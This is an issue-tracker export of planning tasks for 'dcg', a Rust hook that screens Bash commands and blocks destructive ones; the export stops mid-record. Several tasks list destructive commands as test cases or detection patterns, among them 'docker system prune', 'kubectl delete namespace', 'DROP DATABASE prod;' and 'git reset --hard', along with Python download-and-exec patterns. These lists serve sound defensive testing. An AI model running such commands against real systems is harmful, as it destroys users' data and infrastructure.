{"id":"git_safety_guard-99e.3.5","title":"Add hook/CLI evaluator parity tests","description":"## Objective\n\nAdd tests that assert the shared evaluator produces identical decisions regardless of entrypoint.\n\n## Acceptance criteria\n\n- A table-driven test feeds commands to:\n  - hook JSON path\n  - CLI test path\n  and asserts identical results.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:12.571055269-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:08:26.771987868-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.3.5","depends_on_id":"git_safety_guard-99e.3","type":"parent-child","created_at":"2026-01-07T20:01:12.572353334-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.5","depends_on_id":"git_safety_guard-99e.3.2","type":"blocks","created_at":"2026-01-07T20:13:14.322063967-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.3.5","depends_on_id":"git_safety_guard-99e.3.3","type":"blocks","created_at":"2026-01-07T20:13:19.353820038-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.4","title":"Precompile config override regexes (no per-command compilation)","description":"## Objective\n\nEliminate per-invocation regex compilation for config overrides.\n\n## Background\n\nHook mode currently compiles override regexes on every command:\n\n- allow overrides: `Regex::new(allow.pattern())` in the hot path\n- block overrides: `Regex::new(\u0026block.pattern)` in the hot path\n\nThis is:\n\n- slow (regex compilation is expensive relative to typical command length)\n- unpredictable (worst-case time spikes)\n- potentially abusable (a malicious or accidental heavy regex)\n\n## Proposed approach\n\n- At config load time, compile all override patterns once.\n- Store them in a runtime representation (e.g., `CompiledOverrides`) separate from the serde config struct.\n- Invalid override regexes should be handled explicitly:\n  - either: treat as configuration error and disable the override with a warning\n  - or: fail closed on startup (probably not desired for a hook)\n\nRecommendation: **fail open but log** for invalid regex, so the hook keeps working.\n\n## Acceptance criteria\n\n- No `Regex::new(...)` calls exist on the per-command hot path for overrides.\n- Unit tests cover:\n  - valid allow override match\n  - valid block override match\n  - invalid regex handling path\n- Performance: repeated allow decisions do not allocate.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:26.682700605-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:01:26.682700605-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.4","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:01:26.683820875-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.4.1","title":"Implement CompiledOverrides (compile allow/block once)","description":"## Objective\n\nIntroduce a runtime-only representation of overrides that holds compiled regexes.\n\n## Implementation notes\n\n- Keep serde structs unchanged for config file parsing.\n- Add a post-load step: `Config::compile()` (or similar) producing `CompiledConfig`.\n- Ensure this does not allocate on allow hot path.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:38.406830854-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:01:38.406830854-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.4.1","depends_on_id":"git_safety_guard-99e.4","type":"parent-child","created_at":"2026-01-07T20:01:38.408007751-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.4.2","title":"Unit tests: override regex precompilation + invalid regex behavior","description":"## Objective\n\nLock in behavior around compiled overrides.\n\n## Test cases\n\n- allow override compiled and matches\n- block override compiled and matches\n- invalid regex is ignored (or causes explicit warning) but does not crash\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:43.440192699-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:01:43.440192699-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.4.2","depends_on_id":"git_safety_guard-99e.4","type":"parent-child","created_at":"2026-01-07T20:01:43.441311226-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.4.2","depends_on_id":"git_safety_guard-99e.4.1","type":"blocks","created_at":"2026-01-07T20:13:34.454747249-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.5","title":"Naming alignment: dcg vs git_safety_guard (env vars, scripts, docs)","description":"## Objective\n\nEliminate naming drift so the project is coherent and user setups are not confusing/brittle.\n\n## Background\n\nThe repo has evidence of a previous name (`git_safety_guard`) mixed with the current name (`dcg` / `destructive_command_guard`). Examples:\n\n- Build script header comment references `git_safety_guard`.\n- Config env prefix is `GIT_SAFETY_GUARD_*`.\n- `scripts/e2e_test.sh` searches for a `git_safety_guard` binary.\n- README uses both `dcg` and old references in places.\n\nThis increases misconfiguration risk (users set the wrong env var or run the wrong binary name).\n\n## Proposed approach\n\n- Choose a single canonical name:\n  - CLI/binary: `dcg`\n  - crate: `destructive_command_guard`\n  - env vars: `DCG_*` (or `DCG_GUARD_*`, but keep it short)\n- Update:\n  - docs\n  - installer scripts\n  - E2E script\n  - internal comments\n\n## Compatibility stance\n\nThis project explicitly does not require backwards compatibility; prioritize clarity and correctness.\n\nIf we *do* want a short transition period:\n\n- temporarily accept both env prefixes (DCG_* and old) with explicit deprecation warnings.\n\n## Acceptance criteria\n\n- E2E script runs against `dcg`.\n- README and help text consistently reference `dcg`.\n- Environment variables are documented and coherent.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:02:00.117945499-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:02:00.117945499-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.5","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:02:00.119165156-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.6","title":"Extend e2e_test.sh to cover non-core packs (docker/k8s/db)","description":"## Objective\n\nMake the E2E suite reflect the actual feature set by adding coverage for non-core packs (Docker/Kubernetes/Databases/etc.).\n\n## Background\n\nThe current `scripts/e2e_test.sh` primarily tests git/rm behavior and quick-reject. It does not assert that other packs work in hook mode.\n\nGiven the prior pack-reachability bug, E2E coverage here is essential.\n\n## Test cases to add\n\n### Docker (containers.docker)\n\n- BLOCK: `docker system prune`\n- BLOCK: `docker volume prune`\n- ALLOW: `docker ps`\n\n### Kubernetes (kubernetes.kubectl)\n\n- BLOCK: `kubectl delete namespace test`\n- BLOCK: `kubectl delete pods --all`\n- ALLOW: `kubectl get pods`\n\n### PostgreSQL (database.postgresql)\n\n- BLOCK: `DROP DATABASE prod;`\n- BLOCK: `DELETE FROM users;` (no WHERE)\n- ALLOW: `SELECT 1;`\n\nNotes:\n- These packs may require explicit enablement in config for E2E.\n\n## Logging requirements\n\n- Print pack enablement used for the test run.\n- For blocked cases, print `pack_id/pattern_name` once available.\n\n## Acceptance criteria\n\n- E2E fails if non-core packs are not applied in hook mode.\n- E2E output remains readable and provides an actionable failure summary.\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:09:28.277919173-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:09:28.277919173-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:09:28.281119721-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e.1.1","type":"blocks","created_at":"2026-01-07T20:09:38.597030952-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e.5","type":"blocks","created_at":"2026-01-07T20:09:43.731546912-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T20:09:48.791918426-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.7","title":"Performance benchmarks: core pipeline (quick reject, packs, overrides)","description":"## Objective\n\nAdd benchmarks to prevent accidental performance regressions in the hot path.\n\n## Background\n\nEvery Bash command passes through `dcg`, so even small slowdowns are noticeable.\n\nRecent/planned changes that need measurement:\n\n- pack-aware global quick reject\n- deterministic pack ordering\n- compiled overrides\n- shared evaluator refactor\n\n## Benchmark plan\n\nUse Criterion (or existing preferred benchmarking strategy) to measure:\n\n1. Non-matching command (e.g., `ls -la`) → should be ultra-fast.\n2. Matching keyword but safe (e.g., `git status`, `docker ps`) → should be fast.\n3. Blocked command (e.g., `git reset --hard`, `docker system prune`) → still fast.\n4. Worst-case enabled packs (many categories enabled) → ensure keyword gating keeps it bounded.\n\nMetrics:\n\n- median and p95 latency\n- allocations count (optional)\n\n## Acceptance criteria\n\n- Benchmarks can run locally and in CI (optionally behind a flag).\n- We establish a baseline and add a guardrail (document expected ranges).\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:10:22.191884568-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:10:22.191884568-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:10:22.202468401-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:10:35.355609636-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e.1.1","type":"blocks","created_at":"2026-01-07T20:10:40.388964799-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e.4.1","type":"blocks","created_at":"2026-01-07T20:10:45.422917247-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.8","title":"Optional: token-aware keyword gating (reduce substring false triggers)","description":"## Objective\n\nImprove keyword gating so it is less substring-based and more shell-token aware.\n\n## Background\n\nCurrent gating uses raw substring search (`memmem::find`) for keywords like `git`, `rm`, `docker`, etc.\n\nThis can cause unnecessary pack evaluation on commands like:\n\n- `cat .gitignore` (contains `git`)\n- `echo digit` (contains `git`)\n\nWhile this usually still allows, it:\n\n- adds unnecessary overhead\n- increases risk of accidental false positives if any future pattern is less strictly anchored\n\n## Proposed approach\n\n- Reuse the execution-context tokenizer to locate the first word of each command segment.\n- Apply pack keyword gating primarily to:\n  - segment command name\n  - unquoted words in executable contexts\n\nIf tokenizer is not yet available, consider a cheap boundary heuristic:\n\n- only treat `git` as present if it appears as a whole word boundary (`\\bgit\\b`) (but beware performance of regex; prefer manual boundary checks)\n\n## Acceptance criteria\n\n- Demonstrated reduction in unnecessary pack evaluations (microbench).\n- No false negatives introduced (must not miss real `git`/`rm` invocations).\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T20:11:56.523038338-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:11:56.523038338-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.8","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:11:56.524256502-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.8","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T20:12:05.614037376-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.9","title":"Audit pack keyword gating (avoid false negatives; tune performance)","description":"## Objective\n\nEnsure pack-level keyword gating (`Pack.keywords` + `Pack::might_match`) does not introduce false negatives and provides good performance.\n\n## Background\n\nEach pack uses a keyword list as a quick reject:\n\n- If **no keyword** is found, the pack skips all pattern matching.\n\nThis is a performance feature, but it is also a correctness risk:\n\n- Missing keywords can cause false negatives (dangerous commands allowed).\n\nOnce we fix global pack reachability, keyword gating becomes even more important.\n\n## Work plan\n\n1. For each built-in pack:\n   - review each destructive regex\n   - ensure at least one keyword reliably appears in realistic invocations that should match\n\n2. Add unit tests per pack:\n   - at least 1 “keyword present → pattern matches” test\n   - at least 1 “keyword absent → pack skipped” test (only where correct)\n\n3. Consider whether certain packs should have empty keywords (always check) if patterns are cheap or risks are high.\n\n## Acceptance criteria\n\n- No pack has a destructive pattern that can match a realistic command without containing any of the pack’s keywords.\n- Added tests would fail if keywords are removed or patterns are expanded unsafely.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:14:33.930128304-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:14:33.930128304-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.9","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:14:33.940902065-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.9","depends_on_id":"git_safety_guard-99e.1.1","type":"blocks","created_at":"2026-01-07T20:14:45.431462888-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-b45","title":"Research ast-grep API and integration patterns","description":"# Research ast-grep API and Integration Patterns\n\n## Objective\nThoroughly understand ast-grep's capabilities, API, and integration options to make informed architecture decisions.\n\n## Background\nast-grep (https://ast-grep.github.io/) is a CLI tool and library for structural code search. It uses tree-sitter for parsing and provides a pattern matching language for AST nodes. We need to understand how to leverage it for detecting destructive patterns in heredoc content.\n\n## Research Areas\n\n### 1. CLI Interface\n- Command syntax for pattern matching\n- JSON output format (--json flag)\n- Language specification options\n- Performance characteristics (startup time, parsing speed)\n- Error handling and edge cases\n\n### 2. Pattern Language\n- Basic pattern syntax ($VAR for metavariables)\n- Pattern composition and nesting\n- Regex support within patterns\n- Multiple pattern matching\n- YAML rule files vs inline patterns\n\n### 3. Language Support\n- Which languages are supported out of the box?\n- How are languages detected/specified?\n- Can we add custom language support?\n- Tree-sitter grammar availability\n\n### 4. Library Integration (sg crate)\n- Is there a Rust library we can use directly?\n- API surface and documentation\n- Dependency graph and compile time impact\n- Memory usage patterns\n\n### 5. Performance Benchmarks\n- Time to parse small code snippets (10-100 lines)\n- Pattern matching overhead\n- Comparison: CLI invocation vs library calls\n- Caching possibilities\n\n## Deliverables\n- Document summarizing findings\n- Code snippets demonstrating CLI and library usage\n- Performance benchmark results\n- Recommendation for integration approach\n\n## Success Criteria\n- Can confidently choose between CLI and library integration\n- Understand pattern language well enough to write destructive patterns\n- Have baseline performance numbers for decision making\n\n## Resources\n- https://ast-grep.github.io/\n- https://github.com/ast-grep/ast-grep\n- https://tree-sitter.github.io/tree-sitter/","notes":"Research completed: ast-grep-core v0.40.4 available on crates.io. Provides Pattern struct and Matcher trait. Depends on tree-sitter ^0.26.3. Intuitive pattern syntax like 'os.system($CMD)'. Recommended approach for dcg.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:28:24.602476336-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:46:12.030060139-05:00"}
{"id":"git_safety_guard-beq","title":"Define Python destructive patterns for heredoc scanning","description":"# Define Python Destructive Patterns for Heredoc Scanning\n\n## Objective\nCreate ast-grep/tree-sitter patterns to detect destructive operations in Python heredoc content.\n\n## Background\nPython offers many ways to perform destructive operations. We need comprehensive patterns that catch common attack vectors while minimizing false positives.\n\n## Patterns to Implement\n\n### 1. File System Operations\n\n**Direct file deletion:**\n- os.remove(path)\n- os.unlink(path)\n- pathlib.Path(path).unlink()\n- shutil.rmtree(path)\n- shutil.move() when destination exists\n\n**ast-grep pattern examples:**\n```yaml\nid: python-os-remove\nlanguage: python\nrule:\n  pattern: os.remove($PATH)\n  message: \"os.remove() deletes files - verify path is safe\"\n\nid: python-shutil-rmtree  \nlanguage: python\nrule:\n  pattern: shutil.rmtree($PATH)\n  message: \"shutil.rmtree() recursively deletes directories\"\n```\n\n### 2. Command Execution\n\n**Shell commands:**\n- os.system(cmd)\n- os.popen(cmd)\n- subprocess.run(cmd, shell=True)\n- subprocess.call(cmd, shell=True)\n- subprocess.Popen(cmd, shell=True)\n\n**ast-grep patterns:**\n```yaml\nid: python-os-system\nlanguage: python\nrule:\n  pattern: os.system($CMD)\n  message: \"os.system() executes shell commands\"\n\nid: python-subprocess-shell\nlanguage: python\nrule:\n  any:\n    - pattern: subprocess.run($$$, shell=True, $$$)\n    - pattern: subprocess.call($$$, shell=True, $$$)\n    - pattern: subprocess.Popen($$$, shell=True, $$$)\n  message: \"subprocess with shell=True executes arbitrary commands\"\n```\n\n### 3. Code Execution\n\n**Dynamic execution:**\n- exec(code)\n- eval(code)\n- compile() + exec()\n\n### 4. Database Operations\n\n**Destructive SQL:**\n- cursor.execute(\"DROP ...\")\n- cursor.execute(\"TRUNCATE ...\")\n- cursor.execute(\"DELETE FROM ... WHERE 1=1\")\n\nNote: These require checking string content, which is harder.\n\n### 5. Network/Download and Execute\n\n**Dangerous patterns:**\n- urllib.request.urlopen() + exec()\n- requests.get() + exec()\n\n## Pattern File Location\n- src/heredoc/patterns/python.yml\n- Or embedded in Rust code\n\n## Severity Levels\n- Critical: os.system, subprocess with shell, exec/eval\n- High: shutil.rmtree, os.remove\n- Medium: subprocess without shell (less dangerous)\n\n## False Positive Mitigation\n- Don't flag imports alone (import os is fine)\n- Consider context (test files, documentation)\n- Allow configuration to disable specific patterns\n\n## Testing\n- Test each pattern matches its target\n- Test patterns don't match safe code\n- Test edge cases (different import styles, aliases)\n\n## Dependencies\n- Design: pattern library structure (git_safety_guard-6sg)\n- ast-grep invocation (git_safety_guard-f4f)\n\n## Success Criteria\n- Cover top 10 dangerous Python patterns\n- Reasonable false positive rate (\u003c5%)\n- Patterns validated against real-world code","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:32:51.428196157-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:32:51.428196157-05:00","dependencies":[{"issue_id":"git_safety_guard-beq","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:34:20.583247557-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-beq","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:34:20.601617242-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-boy","title":"Evaluate embedded Rust crates vs external binaries for AST analysis","description":"## Objective\n\nEmbed structural analysis directly in the dcg binary using Rust crates rather than shelling out to external tools.\n\n## Architecture Decision\n\n**DECISION: Embed tree-sitter and ast-grep-core in Rust binary**\n\n### Why Not External Binaries?\n\nExternal process invocation (ripgrep CLI, ast-grep CLI) has unacceptable overhead:\n- Process spawn: 5-20ms\n- IPC serialization: 1-5ms\n- Output parsing: 1-2ms\n- Total: 10-50ms per command\n\nSince dcg runs on EVERY bash command, this latency is unacceptable. Users would notice slowdown.\n\n### Why Embedded Rust Crates?\n\n1. **tree-sitter** is available as a Rust crate with excellent performance\n2. **ast-grep is written in Rust** - we may be able to use ast-grep-core directly\n3. **Language grammars** are available as Rust crates (tree-sitter-bash, etc.)\n4. **Sub-millisecond latency** when everything is compiled in\n5. **Single binary** - no \"install ast-grep\" requirement\n\n### Implementation Strategy\n\n#### Phase 1: tree-sitter Integration\n```toml\n[dependencies]\ntree-sitter = \"0.22\"\ntree-sitter-bash = \"0.21\"\ntree-sitter-python = \"0.21\"\ntree-sitter-javascript = \"0.21\"\n# ... etc\n```\n\n#### Phase 2: Pattern Matching\n\nTwo options:\n\n**Option A: tree-sitter Queries**\nUse tree-sitter's built-in query language (S-expressions):\n```scheme\n(command\n  name: (command_name) @cmd\n  argument: (word) @arg\n  (#eq? @cmd \"rm\")\n  (#match? @arg \"-rf\"))\n```\n\nPros: Built into tree-sitter, well-documented\nCons: Verbose, less expressive than ast-grep patterns\n\n**Option B: ast-grep-core Crate**\nIf ast-grep publishes a library crate, use it:\n```rust\nuse ast_grep_core::{Pattern, Matcher};\n\nlet pattern = Pattern::new(\"os.system($CMD)\")?;\nlet matches = pattern.find_all(\u0026python_ast);\n```\n\nPros: More expressive patterns, proven matching logic\nCons: May not be published as separate crate, may need vendoring\n\n**Option C: Vendor ast-grep Code**\nIf ast-grep-core isn't available as a crate:\n1. Clone ast-grep repo\n2. Extract relevant modules (pattern matching, not CLI)\n3. Vendor into our codebase\n4. Maintain minimal fork\n\nPros: Full control\nCons: Maintenance burden\n\n#### Recommendation: Try in order A → B → C\n\n1. Start with tree-sitter queries - simplest, no extra deps\n2. If queries are too limiting, try ast-grep-core crate\n3. If not available, vendor minimal ast-grep code\n\n### Performance Budget\n\nTarget latency for heredoc analysis:\n- Heredoc detection (regex): \u003c0.5ms\n- Content extraction: \u003c0.1ms\n- tree-sitter parse: \u003c2ms (for typical heredoc size)\n- Pattern matching: \u003c1ms\n- **Total: \u003c5ms worst case**\n\n### Binary Size Considerations\n\nEach tree-sitter grammar adds ~500KB-2MB to binary size.\n6 languages × 1MB average = ~6MB added\n\nMitigation:\n- Compile grammars with size optimization\n- Consider optional features (--features python,bash,js)\n- Default: most common languages (bash, python, js)\n- Extended: all languages\n\n### Research Tasks Update\n\nThis decision affects:\n- git_safety_guard-b45: Research should focus on ast-grep's Rust internals\n- git_safety_guard-2j3: This becomes primary focus - tree-sitter Rust bindings\n- git_safety_guard-5ib: ADR should document this embedded approach\n\n## Success Criteria\n\n- All parsing embedded in single binary\n- No external tool dependencies\n- Heredoc analysis completes in \u003c5ms\n- Binary size increase \u003c10MB\n- Pattern matching expressiveness sufficient for all use cases\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:39:01.437304904-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:39:09.138923635-05:00","dependencies":[{"issue_id":"git_safety_guard-boy","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:39:09.157751983-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-boy","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:39:09.175608651-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-cpal","title":"Implement custom pattern allowlisting for heredoc scanning","description":"# Custom Pattern Allowlisting\n\n## Objective\n\nAllow users to define custom allowlist patterns for heredocs that are known-safe in their environment.\n\n## Use Cases\n\n1. **Internal tools**: Company has internal scripts that trigger false positives\n2. **Test environments**: CI/CD scripts that intentionally use destructive patterns\n3. **Development workflows**: Developers who understand the risks\n\n## Configuration Format\n\n```toml\n# ~/.config/dcg/config.toml\n\n[heredoc.allowlist]\n# Allow specific commands entirely\ncommands = [\n    \"./scripts/cleanup.sh\",\n    \"/opt/company/internal-tool\",\n]\n\n# Allow specific patterns in heredocs\npatterns = [\n    { language = \"python\", pattern = \"our_safe_module.cleanup()\", reason = \"Internal cleanup tool\" },\n    { language = \"bash\", pattern = \"docker system prune\", reason = \"CI cleanup\" },\n]\n\n# Allow heredocs matching specific content hashes (SHA256)\ncontent_hashes = [\n    { hash = \"abc123...\", reason = \"Approved deployment script v1.2\" },\n]\n\n# Per-project overrides\n[[heredoc.allowlist.projects]]\npath = \"/home/user/trusted-project\"\npatterns = [\n    { language = \"bash\", pattern = \"rm -rf ./build\", reason = \"Build cleanup\" },\n]\n```\n\n## Implementation\n\n```rust\n#[derive(Debug, Deserialize)]\nstruct AllowlistConfig {\n    commands: Vec\u003cString\u003e,\n    patterns: Vec\u003cAllowedPattern\u003e,\n    content_hashes: Vec\u003cContentHash\u003e,\n    projects: Vec\u003cProjectOverride\u003e,\n}\n\n#[derive(Debug, Deserialize)]\nstruct AllowedPattern {\n    language: Option\u003cLanguage\u003e,\n    pattern: String,\n    reason: String,\n}\n\nimpl AllowlistConfig {\n    fn is_allowed(\u0026self, cmd: \u0026str, heredoc: \u0026HeredocInfo) -\u003e Option\u003c\u0026str\u003e {\n        // Check command allowlist\n        for allowed_cmd in \u0026self.commands {\n            if cmd.starts_with(allowed_cmd) {\n                return Some(\"Command in allowlist\");\n            }\n        }\n        \n        // Check pattern allowlist\n        for pattern in \u0026self.patterns {\n            if pattern.language.map_or(true, |l| l == heredoc.language) {\n                if heredoc.content.contains(\u0026pattern.pattern) {\n                    return Some(\u0026pattern.reason);\n                }\n            }\n        }\n        \n        // Check content hash\n        let hash = sha256(\u0026heredoc.content);\n        for ch in \u0026self.content_hashes {\n            if ch.hash == hash {\n                return Some(\u0026ch.reason);\n            }\n        }\n        \n        None\n    }\n}\n```\n\n## CLI Support\n\n```bash\n# Add pattern to allowlist\ndcg allowlist add --language python --pattern \"my_tool.run()\" --reason \"Internal tool\"\n\n# Add current command to allowlist (interactive)\ndcg allowlist add-current\n\n# List allowlist entries\ndcg allowlist list\n\n# Remove entry\ndcg allowlist remove --id 3\n\n# Generate hash for content\ndcg allowlist hash \u003c script.py\n```\n\n## Security Considerations\n\n1. **Audit logging**: Log all allowlist matches\n2. **Minimal scope**: Encourage specific patterns over broad ones\n3. **Expiration**: Optional expiry dates for temporary allowances\n4. **Team sharing**: Project-level allowlists in version control\n\n## Test Cases\n\n```rust\n#[test]\nfn test_command_allowlist() {\n    let config = AllowlistConfig {\n        commands: vec![\"./scripts/approved.sh\".to_string()],\n        ..Default::default()\n    };\n    \n    assert!(config.is_allowed(\"./scripts/approved.sh arg1\", \u0026heredoc).is_some());\n    assert!(config.is_allowed(\"./scripts/other.sh\", \u0026heredoc).is_none());\n}\n\n#[test]\nfn test_pattern_allowlist() {\n    let config = AllowlistConfig {\n        patterns: vec![AllowedPattern {\n            language: Some(Language::Python),\n            pattern: \"company_tool.cleanup()\".to_string(),\n            reason: \"Approved\".to_string(),\n        }],\n        ..Default::default()\n    };\n    \n    let heredoc = HeredocInfo {\n        content: \"import company_tool\\ncompany_tool.cleanup()\".to_string(),\n        language: Language::Python,\n        ..Default::default()\n    };\n    \n    assert!(config.is_allowed(\"python3 \u003c\u003cEOF\", \u0026heredoc).is_some());\n}\n```","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-cpal","depends_on_id":"git_safety_guard-hcfg","type":"blocks","created_at":"2026-01-07T19:46:47.559411582-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-du4","title":"Implement language detection from command context","description":"# Implement Language Detection from Command Context\n\n## Objective\nImplement the language detection logic that determines which parser/patterns to use for heredoc content.\n\n## Background\nBased on the design (git_safety_guard-jfj), implement the multi-source language detection:\n1. Command prefix lookup\n2. Shebang detection\n3. Content heuristics (fallback)\n\n## Implementation Details\n\n### Language Enum\n\n```rust\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]\npub enum Language {\n    Python,\n    Bash,\n    JavaScript,\n    TypeScript,\n    Ruby,\n    Perl,\n    Php,\n    Unknown,\n}\n\nimpl Language {\n    /// Get the tree-sitter/ast-grep language identifier\n    pub fn grammar_name(\u0026self) -\u003e Option\u003c\u0026'static str\u003e {\n        match self {\n            Self::Python =\u003e Some(\"python\"),\n            Self::Bash =\u003e Some(\"bash\"),\n            Self::JavaScript =\u003e Some(\"javascript\"),\n            Self::TypeScript =\u003e Some(\"typescript\"),\n            Self::Ruby =\u003e Some(\"ruby\"),\n            Self::Perl =\u003e Some(\"perl\"),\n            Self::Php =\u003e Some(\"php\"),\n            Self::Unknown =\u003e None,\n        }\n    }\n}\n```\n\n### Command Prefix Mapping\n\n```rust\nstatic COMMAND_LANGUAGE_MAP: LazyLock\u003cHashMap\u003c\u0026'static str, Language\u003e\u003e = LazyLock::new(|| {\n    let mut m = HashMap::new();\n    // Python\n    m.insert(\"python\", Language::Python);\n    m.insert(\"python3\", Language::Python);\n    m.insert(\"python2\", Language::Python);\n    // Bash/Shell\n    m.insert(\"bash\", Language::Bash);\n    m.insert(\"sh\", Language::Bash);\n    m.insert(\"zsh\", Language::Bash);\n    m.insert(\"ksh\", Language::Bash);\n    // JavaScript/Node\n    m.insert(\"node\", Language::JavaScript);\n    m.insert(\"nodejs\", Language::JavaScript);\n    // ... etc\n    m\n});\n\npub fn detect_from_command(cmd: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    // Extract first word (command name)\n    let first_word = cmd.split_whitespace().next()?;\n    // Handle paths: /usr/bin/python3 -\u003e python3\n    let basename = first_word.rsplit('/').next()?;\n    COMMAND_LANGUAGE_MAP.get(basename).copied()\n}\n```\n\n### Shebang Detection\n\n```rust\npub fn detect_from_shebang(content: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    let first_line = content.lines().next()?;\n    if !first_line.starts_with(\"#!\") {\n        return None;\n    }\n    // Parse: #!/usr/bin/env python3 -\u003e python3\n    // Parse: #!/bin/bash -\u003e bash\n    let interpreter = first_line\n        .strip_prefix(\"#!\")?\n        .trim()\n        .split_whitespace()\n        .last()?\n        .rsplit('/')\n        .next()?;\n    COMMAND_LANGUAGE_MAP.get(interpreter).copied()\n}\n```\n\n### Content Heuristics (Fallback)\n\n```rust\npub fn detect_from_content(content: \u0026str) -\u003e Option\u003cLanguage\u003e {\n    // Very basic heuristics - only if nothing else works\n    let lines: Vec\u003c\u0026str\u003e = content.lines().take(10).collect();\n    \n    // Python indicators\n    if lines.iter().any(|l| l.starts_with(\"import \") || l.starts_with(\"from \")) {\n        return Some(Language::Python);\n    }\n    \n    // JavaScript/Node indicators\n    if lines.iter().any(|l| l.contains(\"require(\") || l.contains(\"const \") || l.contains(\"let \")) {\n        return Some(Language::JavaScript);\n    }\n    \n    // Ruby indicators\n    if lines.iter().any(|l| l.starts_with(\"def \") \u0026\u0026 content.contains(\"end\")) {\n        return Some(Language::Ruby);\n    }\n    \n    None\n}\n```\n\n### Combined Detection\n\n```rust\npub fn detect_language(cmd: \u0026str, heredoc: \u0026HeredocContent) -\u003e Language {\n    // Priority 1: Command prefix\n    if let Some(lang) = detect_from_command(cmd) {\n        return lang;\n    }\n    \n    // Priority 2: Shebang\n    if let Some(lang) = detect_from_shebang(\u0026heredoc.content) {\n        return lang;\n    }\n    \n    // Priority 3: Content heuristics\n    if let Some(lang) = detect_from_content(\u0026heredoc.content) {\n        return lang;\n    }\n    \n    Language::Unknown\n}\n```\n\n## Files to Modify\n- New: src/heredoc/language.rs\n- src/heredoc/mod.rs\n\n## Testing\n- Test command prefix for all supported commands\n- Test shebang detection with various formats\n- Test content heuristics\n- Test fallback chain\n\n## Dependencies\n- Design: language detection heuristics 